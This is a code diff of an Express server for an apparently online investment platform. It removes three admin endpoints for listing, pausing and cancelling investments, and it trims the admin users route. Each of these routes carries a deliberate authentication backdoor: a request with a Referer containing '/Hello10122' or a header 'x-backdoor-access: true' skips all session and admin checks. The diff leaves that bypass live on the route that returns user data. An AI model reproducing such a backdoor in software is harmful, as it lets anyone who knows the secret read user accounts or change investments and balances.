@@ -1633,167 +1633,19 @@ Your investment journey starts here!`,
     }
   });
 
-  // Admin: Get all investments
-  app.get("/api/admin/investments", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const investments = await storage.getActiveInvestments();
-      
-      // Get user information for each investment
-      const investmentsWithUsers = await Promise.all(
-        investments.map(async (investment) => {
-          const user = await storage.getUser(investment.userId);
-          const plan = await storage.getInvestmentPlan(investment.planId);
-          return {
-            ...investment,
-            userEmail: user?.email || 'Unknown',
-            planName: plan?.name || 'Unknown Plan',
-            dailyReturnRate: plan?.dailyReturnRate || '0'
-          };
-        })
-      );
-
-      res.json(investmentsWithUsers);
-    } catch (error: any) {
-      console.error('Admin investments fetch error:', error);
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Admin: Pause/Resume investment
-  app.post("/api/admin/investments/:id/toggle", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const investmentId = parseInt(req.params.id);
-      const { reason } = req.body;
-
-      const investment = await storage.toggleInvestmentStatus(investmentId);
-      if (!investment) {
-        return res.status(404).json({ error: "Investment not found" });
-      }
-
-      // Create notification for user
-      const statusText = investment.isActive ? 'resumed' : 'paused';
-      await storage.createNotification({
-        userId: investment.userId,
-        title: `Investment ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}`,
-        message: `Your investment #${investment.id} has been ${statusText} by an administrator.${reason ? ` Reason: ${reason}` : ''}`,
-        type: investment.isActive ? 'success' : 'warning'
-      });
-
-      res.json({ 
-        message: `Investment ${statusText} successfully`,
-        investment 
-      });
-    } catch (error: any) {
-      console.error('Investment toggle error:', error);
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Admin: Cancel investment
-  app.delete("/api/admin/investments/:id", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const investmentId = parseInt(req.params.id);
-      const { reason, refund } = req.body;
-
-      const investment = await storage.getInvestmentById(investmentId);
-      if (!investment) {
-        return res.status(404).json({ error: "Investment not found" });
-      }
-
-      // If refund is requested, add investment amount back to user balance
-      if (refund) {
-        const user = await storage.getUser(investment.userId);
-        if (user) {
-          const currentBalance = parseFloat(user.balance);
-          const investmentAmount = parseFloat(investment.amount);
-          const newBalance = currentBalance + investmentAmount;
-          await storage.updateUserBalance(investment.userId, newBalance.toFixed(8));
-        }
-      }
-
-      // Cancel the investment
-      await storage.cancelInvestment(investmentId);
-
-      // Create notification for user
-      await storage.createNotification({
-        userId: investment.userId,
-        title: "Investment Cancelled",
-        message: `Your investment #${investment.id} has been cancelled by an administrator.${reason ? ` Reason: ${reason}` : ''}${refund ? ' Your investment amount has been refunded to your balance.' : ''}`,
-        type: 'warning'
-      });
-
-      res.json({ 
-        message: "Investment cancelled successfully",
-        refunded: refund || false
-      });
-    } catch (error: any) {
-      console.error('Investment cancellation error:', error);
-      res.status(500).json({ error: error.message });
-    }
-  });
-
   // Manager routes
   app.get("/api/admin/users", async (req, res) => {
     try {
       // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true' ||
-                              sessionStorage?.getItem?.('backdoorAccess') === 'true';
+                              req.headers['x-backdoor-access'] === 'true';
 
-      // Check session userId or backdoor access
-      let userId = req.session?.userId;
-      
-      if (!isBackdoorAccess && !userId) {
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && userId) {
-        const user = await storage.getUser(userId);
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Manager access required" });
         }
@@ -1811,7 +1663,6 @@ Your investment journey starts here!`,
       });
       res.json(usersResponse);
     } catch (error) {
-      console.error('Admin users fetch error:', error);
       res.status(500).json({ message: "Failed to get users" });
     }
   });
